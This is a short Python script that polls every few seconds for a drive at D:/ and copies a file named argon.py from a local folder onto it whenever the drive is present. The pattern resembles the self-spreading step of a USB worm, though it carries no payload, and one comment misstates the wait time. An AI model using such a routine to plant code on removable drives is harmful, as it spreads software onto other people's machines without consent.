import os
import shutil
import time

# Keep checking for the USB drive every 5 seconds
while True:
    try:
        # Check if the target directory exists (USB drive is connected)
        if os.path.exists("D:/"):
            # Copy the file to the target directory
            shutil.copyfile('{}\\scr\\argon.py'.format(os.getcwd()), 'D:/argon.py')
            print("File copied successfully!")
            time.sleep(3)
    except Exception as e:
          print(e)

    time.sleep(1)  # Wait for 5 seconds before checking again